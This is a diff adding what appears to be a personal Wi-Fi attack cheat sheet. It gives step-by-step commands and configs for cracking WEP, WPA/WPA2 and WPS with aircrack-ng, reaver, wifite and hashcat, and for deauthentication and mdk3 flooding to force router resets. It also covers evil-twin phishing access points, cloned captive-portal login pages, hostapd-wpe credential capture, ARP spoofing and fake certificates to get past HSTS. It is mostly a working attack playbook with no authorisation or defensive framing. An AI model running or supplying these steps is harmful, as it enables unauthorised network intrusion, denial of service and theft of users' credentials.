@@ -1,0 +1,697 @@
+# Preparing the WNIC
+# # Change MAC Address
+ifconfig wlan0 down
+ifconfig wlan0 hw ether aa:bb:cc:dd:ee:ff
+ifconfig wlan0 up
+; We may also use more advanced tools such as `macchanger`.
+
+# Set the WNIC in monitor mode
+ifconfig wlan0 down
+airmon-ng start wlan0
+ifconfig wlan0 up
+; check if the interface is in monitor mode
+iwconfig 
+
+
+# Attacking WEP
+
+## WEP cracking with aircrack-ng
+### Search for access point
+airodump-ng wlan0mon
+
+## Now we know the channel, the MAC adddress and some of the stations connected, sniff only this AP
+airodump --channel <channel> --bssid <bssid> --write filenameprefix wlan0mon
+
+## Now we will send a fake authentication packet pretending to be one of the clients
+### If there is no client connected we want to use aireplay-ng with `-1`
+aireplay-ng -1 0 -e <ESSID> -a <access_point_mac> -h <station_mac> wlan0mon
+
+### In this way we kicked the `station_mac` client off and captured the reconnection
+### of the station to the AP.
+
+### If there is at leaast a client connected we can use that client MAC address and
+### use aireplay-ng with `-3` which is a classic attack. 
+aireplay-ng -3 -b <access_point_mac> -h <station_mac> wlan0mon
+
+
+## While the process is going we can start the cracking process by doing:
+aircrack-ng --new-session <cap_file>.session -b <bssid_ap> <filename.cap>
+
+## We may restore the cracking session by doing:
+aircrack-ng --restore-session <cap_file>.session
+
+## On some versions this may not work and we should help us with john by doing:
+john --session=foo --stdout --wordlist=wordlist.dic | aircrack-ng -w - -b <target_mac> file.cap
+
+## And restore it with
+john --restore=foo | aircrack-ng -w - -b <target_mac> file.cap
+
+We generally need from 10k to 250k IVs
+
+## WEP cracking with wifite
+
+We just do:
+```sh
+wifite
+```
+we then press ctrl+c and then we choose the number associated to the target AP 
+we want to attack.
+It will just do everything automatically.
+
+
+## Attacking WPA/WPA2
+
+There are three ways to hack into WPA/WPA2 networks:
+* Cracking the password after the 4-way handshake capture
+* Exploiting WPS
+* Evil Twin Attacks with Open Network Web Authentication
+
+### WPA/WPA2 cracking with aircrack-ng
+
+We check our target network:
+```sh
+airodump-ng wlan0mon
+```
+
+Once we detected the target we can go on by doing:
+```sh
+airodump-ng --channel <channel_id> --bssid <ap_mac> --write <filenameprefix> wlan0mon
+```
+
+At this point we need the handshake, so we can either:
+* wait for a connection or
+* perform a deauthentication attack
+
+To perform a deauthentication attack we can do:
+```sh
+aireplay-ng --deauth 0 -a <ap_mac> -c <client_mac> wlan0mon
+# remember that if we omit the -c <client_mac> we will perform the attack
+# against all target connected
+# --deauth 0 will continue infinitely, e can also only specify a number like 10
+# to send only 10 deauthentication packets
+```
+
+
+We can stop as soon as we see in airodump the handshake popping up in the top
+right corner of the screen.
+
+Now we can use a dictionary attack to crack the password:
+
+```sh
+aircrack-ng --new-session <filename>.session <filename.cap> -w </path/to/wordlists.txt>,</path/to/wordlist2.txt>
+```
+we may restore the session with:
+
+```sh
+aircrack-ng --restore-session <filename>.session 
+```
+On some versions this may not work and we should help us with john by doing:
+```sh
+john --session=foo --stdout --wordlist=wordlist.dic | aircrack-ng -w - -b <target_mac> file.cap
+```
+And restore it with:
+```sh
+john --restore=foo | aircrack-ng -w - -b <target_mac> file.cap
+```
+
+Notice that we can filter out from our wordlists words shorter than 8 characters 
+or longer than 63 characters, also remember that passphrases only contain ASCII
+characters.
+
+
+### WPA/WPA2 cracking with wifite
+
+For WPA2, let's be sure to have at least wifite.py version 2.00.
+
+```sh
+wifite --no-reaver --dict <path/to/wordlists.txt>
+# we have to explicitly say to not attempt WPS attacks if we want to crack
+# WPA2 passwords
+```
+
+Now we can just press ctrl+c and then choose our target WPA2 encrypted network.
+At this point the attack will start and we will just have to wait, it will start
+a deauthentication attack to capture the handshake and the subsequently it will
+start the cracking process.
+
+### WPS cracking with wash, reaver and bully
+
+WPS networks can be attacked by using a combination of tools, such as:
+* Wash, which is used to identify WPS networks
+* Reaver, which is used to determine the WPS pin
+* Bully, which is used to find th WPA2 password with a known WPS pin
+
+```sh
+wash -i wlan0mon
+```
+
+Now if we see associated to a certain WiFi the Lck (Lock) string set to:
+* No, it means that we can attempt a WPS attack with reaver
+* Yes, it means that the router is not susceptible to WPS attack, or that it has
+  been locked by somme passwords attempt, we may try to wait few minutes
+
+Now we can copy the MAC address of the target access point and then use reaver:
+```sh
+reaver -i wlan0mon -b <mac_address> -v -N
+# the -v or -vv gives us verbose output
+# notice that we may enable a delay between attempt
+# -N will not attempt the same pin over and over
+```
+
+Some routers may have lockout policies, so it may be a good idea to attempt
+the attack like this:
+```sh
+reaver -i wlan0mon -b <mac_address> -vv -N -d 3 -l 120
+# here we set a delay of 3 seconds between pin attempts
+# and a lockout wait of 120 seconds
+```
+
+Once we know the pin we can retrieve the password of the wify by using tools
+like `bully`, and by doing:
+```sh
+bully -b <mac_ap> -p <WPS_pin> wlan0mon
+```
+If we get an error saying that the PIN number must be less then 8 digits, we can
+just remove the last digit, since that is the checksum digit as we may recall.
+
+Notice that in more recent versions of reaver, the functionality of bully is 
+integrated inside reaver.
+
+
+#### Troubleshooting reaver problems
+
+Sometimes reaver can just get stuck, and a good idea to troubleshoot the problem
+is to rerun reaver by using the `-vvv` flags to enable a very verbose mode.
+
+##### Failed to Associate
+
+When we have this problem, we may try to fix it by stopping reaver and using aireplay-ng 
+and doing:
+```sh
+aireplay-ng --fakeauth 100 -a <mac_ap> -h <my_mac> mon0
+```
+
+This will basically allow us to associate with the target, instead of using
+reaver to associate with the target.
+
+Now we can launch reaver by doing:
+```sh
+reaver -i wlan0mon -b <mac_address> -N -d 3 -l 120 -A 
+# the -A flag, will not ask reaver to associate
+```
+
+##### Percentage Stuck at xx%%
+
+In this case we may want to debug further by using reaver in a very verbose
+mode:
+```sh
+reaver -i wlan0mon -b <mac_address> -vvv -N -d 3 -l 120 -A
+```
+
+If we see that the same PIN is tried over and over, we can launch reaver with
+the `-N` flag.  So we can fix this problem by doing:
+```sh
+reaver -i wlan0mon -b <mac_address> -vvv -N -d 3 -l 120 -A -N
+```
+
+##### Detected AP rate limiting
+
+This message is received when routers lock after a number of failed attempts.
+The solutions to this problem can be:
+* Get the user to reset the router
+* Try somehow to reset the router
+
+
+One way to do this, is to deauthenticate all the computers on the network, and
+hope that some of the users will go there and restart the router.
+
+```sh
+aireplay-ng --deauth -a <ap_mac> 
+# this will deauthenticate all the clients
+```
+
+Another solution is to use mdk3, which by flooding the router causes on some
+models to reset autommatically.
+
+```sh
+mdk3 mon0 a -a <ap_mac> -m
+# this will basically send plenty of authentication frames coming from a huge
+# number of different fake MAC addresses, and will freeze or reset almost every AP
+# the `a` specifies an authentication attack
+# the `-a` specifies to perform the attack only on a specific target
+# the `-m` specifies to use only valid MAC addresses taken from the OUI database
+```
+
+At this point, although we see the "INVULNERABLE" strings coming out, we should
+wait a little bit, sometimes we really need a huge number of clients like
+50,000 clients.
+We won't have any message telling us that it worked, after a while we press
+ctrl+c and we can check if the AP is locked by using wash and doing:
+```sh
+wash -i mon0
+```
+
+Remember that this works on many routers, but not all.
+
+
+### WPS cracking with wifite
+
+We can attempt to crack WPS by using wifite, and this can be done by simply
+doing:
+
+```sh
+wifite
+```
+
+Then detecting the target network which WPS enabled, at this point we press
+ctrl+c and then select the target network through its ID number.
+
+Wifite, will automatically attempt a bruteforce of the PIN and give us both the
+PIN and the wireless security.
+
+
+### Evil Twin Attack for WPA/WPA2
+
+This is the last resort to attack WPA/WPA2 networks, which uses social
+engineering too perform the attack, what we do here is to create an evil twin
+network which has no authentication with an automatic redirect to a web login
+page where the user will have to insert username and password.
+Now of course this will not work with more skilled users which will notice that
+the network has no authentication and is asking strangely for credentials on a
+web page, but still it has a very high success rate. 
+
+Basically here, we can do the entire procedure (exact same steps) reported in
+the section related to attacking captive portals.
+The only difference is that in this case we do not have any page to clone so we
+have to carefully choose the web page that we are going to use. Some ideas are:
+* If we know the network provider we can take some samples online with the
+  provider logo or create one, generally we may know network provider sometimes
+  from the SSID
+* Examining the MAC address of the router we can understand what is the brand
+  and download or create a login page similar to the ones used by these brands
+* Design one ourselves
+* Download some template online
+
+Here we will show an alternative way to create a fake AP without doing all the
+steps manually but using some software to do all of this automatically.
+One software to automate all the manual steps shown before is `fluxion`.
+
+Fluxion will basically:
+1. Start a fake AP with the same name as the target network
+2. Start a web server with a fake login page
+3. Deauthenticate all the clients
+4. Display the login page once a client connects to the fake AP
+5. Check if the entered password is correct
+
+Notice that fluxion cannot be used for captive portals, so the manual steps
+described in the captive portal section are still useful and needed in that
+scenario.
+
+Once fluxion is installed, we can launch it by doing:
+```sh
+bash fluxion.sh
+```
+
+At this point the procedure is guided, so we just use numbers to make our
+choices inside the fluxion interface.
+
+Notice that we may still have a problem related to the visualization of the page
+in certain scenarios, in this cases, the problems are still related to not using
+absolute links in the html page.
+We can fix this, by modifying the index html page found in the temporary
+directory created by fluxion which is in `/tmp/` and by performing a couple of
+search and replace, that are:
+* `href="` with `href="/`
+* `src="` with `src="/`
+* `form action="` with `form action="/`
+
+Now everything will work.
+
+Another good suggestion is to explore `wifiphiser` which is another very useful
+tool to perform Evil Twin Attacks, KARMA Attacks and other kinds of credentials
+stealing phishing attacks.
+
+
+## Attacking WPA/WPA2 Enterprise
+
+There are two ways to hack WPA2/Enterprise:
+* Evil Twin Attack with Fake Open Authentication Login
+* Evil Twin Attack with WPA/WPA2 Enterprise network
+
+
+### Fake Open Authentication Login (MISSING, probably with hostapd)
+
+### Fake WPA/WPA2 Enterprise network
+
+We can use hostapd-wpe, we want to change the configuration of hostapd, by
+doing:
+```sh
+vim /etc/hostapd-wpe/hostapd-wpe.conf
+```
+Here we want to modify:
+* Interface name
+* SSID
+
+Now we can do:
+```sh
+service network-manager stop # to stop NetworkManager
+```
+
+and then launch hostapd-wpe by doing:
+```sh
+hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
+```
+
+Now once the user connects, we are able to capture its username, its challenge
+and its response.
+
+Now we are going to use a dictionary attack, we can use asleap to do this, by
+doing:
+
+```sh
+asleap -C <challenge> -R <response> -W </path/to/pwordlist.txt>
+```
+
+## Attacking Captive Portals
+
+
+On networks using a captive portal we have different solutions:
+* Change MAC address to one of a connected client
+* Sniff logins in monitor mode (only HTTP portals)
+* Connect and sniff logins after running an arp spoofing attack (only HTTP portals)
+* Create a Fake AP and ask users to login
+
+### Sniff logins in monitor mode
+
+Be sure to set the wireless card in monitor mode:
+```sh
+ifconfig wlan0 down
+iwconfig wlan0 mode monitor
+ifconfig wlan0 up
+```
+
+Now we can check which is our target network by running:
+```sh
+airodump-ng wlan0
+```
+
+Once we find out which is the network we are interested in, we want to create a
+capture file to analyze with wireshark only for that network, we can do that by
+launching airodump on the target:
+```sh
+airodump-ng --bssid <target_mac> --channel <channel_id> --write <file_prefix> wlan0 
+```
+
+Now that we have the capture file we can open it with wireshark, at this point
+we are only interested in the HTTP POST requests, because that's where generally
+credentials are passed, so we may use some wireshark filter to locate HTTP
+requests or more specifically HTTP POST requests.
+
+Inspect these POST requests to find the credentials, and the game is done.
+
+### Sniff Credentials by ARP Spoofing
+
+
+We must connect to the network, and once connected we may use many tools to
+perform ARP spoofing, let's see a couple of options:
+```sh
+ettercap -Tq -M arp:remote -i wlan0 ///
+# this will perform ARP spoofing for all the clients on the network
+```
+
+Another option may be using `mitmf` by doing:
+```sh
+mitmf --arp --spoof -i wlan0 --gateway <gateway_address>
+# the gateway address can be retrieved by issuing a `route -n`
+```
+
+### Sniff Credentials by Fake AP
+
+In this case what we do is:
+* Clone the login page used by the captive portal
+* Create a fake AP with same/similar name
+* Deauthenticate users so that they will use the fake network with cloned page
+* Sniff credentials
+
+
+#### Cloning the Login Page
+
+In order to clone the login page used by the captive portal, we first connect to
+the open network, then we can just `save as` the webpage from a browser like
+firefox.
+
+Once the page html+directory with other contents is saved, we have to copy it in
+the webroot directory and we can rename the main html page as `index.html`.
+Then, now we can start the web server process such as apache2, and make a double
+check by trying to connect to our IP address.
+
+Notice that we may need to modify the web page to put absolute links, we must
+check for each href related to images, css, js or any other file if it contains
+an initial slash, if it does not contain an initial slash, we must insert it.
+A search and replace with the file directory name is a good idea here, we just
+have to replace with the same name but with added an initial slash before the
+directory name.
+
+Another additional step we may need to perform is to check if the login input
+box are inside an html form, generally this is the case, but it may not be like
+this. In the case there is no form, it is always a better idea to insert it
+manually by modifying the html page. This is done because having a form allows a
+simpler sniffing of the credentials.
+Generally the html minimum code to wrap around the username, password and login
+button is:
+```html
+<form method="post" action="/index.html">
+...
+</form>
+```
+
+Sommetimes for the login button if we have added form, we may need to add a
+submit button, this can be done by adding inside the form the following html:
+```html
+<form method="post" action="/index.html">
+...
+<input type="submit" value="Log In">
+</form>
+```
+We may also need to save the style of the button, we can again do this by
+saving the value of the "value" string from the original html and copy it inside
+the input tag like this:
+```html
+<form method="post" action="/index.html">
+...
+<input style="string..." type="submit" value="Log In">
+</form>
+```
+
+The more we know about html and css the more we will be able to reproduce a
+verbatim copy of the original login page.
+
+
+#### Creating a Fake AP
+
+In order to create a fake AP we must have three elements:
+* A router broadcasting a signal -> we can use `hostapd` 
+* A DHCP server to provide clients IP addresses -> we can use `dnsmasq` 
+* A DNS server to provide clients name resolutions -> we can use `dnsmasq` 
+
+Once hastapd and dnsmasq are installed we can proceed by stopping networkmanager
+which can cause problems:
+```sh
+service network-manager stop
+```
+Then we have to enable packet forwarding from our machine but also flush all 
+iptables rules, generally we shouldn't have any conflicting
+rules, but for the sake of being sure, we may want to flush all rules by doing:
+```sh
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables --flush
+iptables --table nat --flush
+iptables --delete-chain
+iptables --table nat --delete-chain
+iptables -P FORWARD ACCEPT
+```
+At this point nothing should interfere with our attack.
+
+Now let's configure dnsmasq, we may have a basic configuration file like this
+one:
+```dnsmasq.conf
+#Set the wifi interface
+interface=wlan0
+
+#Set the IP range that can be given to clients,
+# in this case each IP can last only 8 hours
+dhcp-range=10.0.0.10,10.0.0.100,8h
+
+#Set the gateway IP address
+dhcp-option=3,10.0.0.1
+
+#Set dns server address
+dhcp-option=6,10.0.0.1
+
+#Redirect all requests to 10.0.0.1, which will be our machine IP address
+```
+
+Once the configuration is done we can launch dnsmasq, by doing:
+```sh
+dnsmasq -C /path/to/config/file.conf
+```
+
+Now we have a DNS and DHCP server running.
+
+Now in order to setup hostapd to create the fake AP we just create a
+configuration file like this:
+```hostapd.conf
+#Set wifi interface
+interface=wlan0
+
+#Set network name (SSID)
+ssid=royal wifi v2
+
+#Set channel
+channel=1
+
+#Set driver
+driver=nl80211
+```
+
+Now to launch hostapd we do:
+```sh
+hostapd /path/to/config/file.conf -B
+# the -B flag will run the command in background
+```
+
+Now we have to set our IP Address accordingly, indeed if we do `ifconfig wlan0`
+we can see that we still do not have an IP address assigned, in order to assign
+an IP address to our wlan0 network interface we do:
+```sh
+ifconfig wlan0 10.0.0.1 netmask 255.255.255.0
+# use the same ip address mentioned in the dnsmasq configuration
+```
+
+Now we can start the web server service, e.g., in the case of apache we do:
+```sh
+systemctl start apache2
+```
+
+Now we are still not done, since we want to create a real captive portal
+experience, so there are still some small things we have to handle, for example
+we need some rewrite rules on apache, in order to do this we need to modify the
+apache2 configuration file which is generally in:
+
+`/etc/apache2/sites-enabled/000-default.conf`
+
+from here we need to rewrite rules, let's append the following piece of
+configuration:
+```sh
+<Directory "/var/www/html">
+    RewriteEngine On
+    RewriteBase /
+    RewriteCond %{HTTP_HOST} ^www\.(.*)$ [NC]
+    RewriteRule ^(.*)$ http://%1/$1 [R=301,L]
+    
+    RewriteCond %{REQUEST_FILENAME} !-f
+    RewriteCond %{REQUEST_FILENAME} !-d
+    RewriteRule ^(.*)$ / [L,QSA]
+</Directory>
+```
+
+Notice that inside the already existing tag called `<VirtualHost :80>`, we have
+to add a line which states:
+```sh
+ErrorDocument 404 /
+# this is used to redirect to the index page for each resource which is not found
+```
+
+Now this is almost like a real captive portal, but the only thing is that
+because of HSTS when users browse to facebook or google or other big websites
+with HSTS enabled they will still have a "Secure Connection Failed", so in order
+to solve this issue we may use a fake SSL certificate.
+
+We have to enable https on apache, so we first generate a fake SSL certificate,
+by doing:
+```sh
+openssl req -new -x509 -days 365 -out /path/to/dir/cert.pem -keyout /path/to/dir/cert.key
+# we are specifying a certificate which will be valid for 365 days
+# and then we specify the output directory where the pem and key files will be
+# saved
+```
+Let's insert random info when asked, and then we will have the `.pem` and the
+`.key` file, at this point to enable https on apache we can do:
+```sh
+a2enmod ssl
+```
+and then let's open the configuration file as before which is at
+`/etc/apache2/sites-enabled/000-default.conf`
+
+at this point we have to add a new virtualhost tag entry for port 443, by
+inserting:
+```sh
+<VirtualHost *:443>
+    SSLEngine   On
+    SSLCertificateFile      /path/to/dir/cert.pem
+    SSLCertificateKeyFile   /path/to/dir/cert.key  
+
+</VirtualHost>
+```
+
+Now we also have to enable port 443, to do this we need to momdify the file
+`/etc/apache2/ports.conf`. We must have:
+```sh
+Listen 80
+Listen 443
+```
+
+Now everything is done and we can restart apache2, when we do this, the password
+related to the certificate will be asked and everything will be on now.
+We can test now by browsing both to our http and https website versions on our
+IP address.
+
+Now we can start sniffing on our network interface by doing:
+```sh
+tshark -i wlan0 -w ap_name.cap
+# now it will start to capture the packets
+```
+
+Now our network interface is there sniffing packets and we can start to
+deauthenticate users from the network by issuing;
+```sh
+aireplay-ng --deauth 0 -a <ap_mac> -c <client_mac> wlan0
+```
+
+Now the game is done, and users will issue their credentials hopefully.
+We can start to analyze the .cap file with wireshark and search for HTTP POST
+requests, and we will see credentials in the request packet.
+
+
+## Cracking Faster with Hashcat
+
+We may use hashcat to crack passwords faster by using available GPUs, but first
+we have to convert the `.cap` file to a file compatible with hashcat, and this
+can be done, either online or with hashcat-utils, by doing:
+
+```sh
+cap2hccapx capture.cap capturefile.hccapx
+```
+
+```sh
+hashcat -I 
+# this will show available platforms, be sure to have installed all required
+# dependencies such as opencl and so on
+```
+
+To check available formats we can do:
+```sh
+hashcat --help
+```
+
+From here we can see that WPA/WPA2 is the option "2500", so we can do:
+```sh
+hashcat -m 2500 -d 1 capturefile.hccapx wordlist.txt
+# with -m 2500 we choose to crack WPA/WPA2 hashes
+# with -d 1 we select the first device in the device list shown with
+# `hashcat -I`
+# capturefile.hccapx is the hasshcat compatible file with hashes
+# wordlist.txt is the wordlist file
+```
+
+
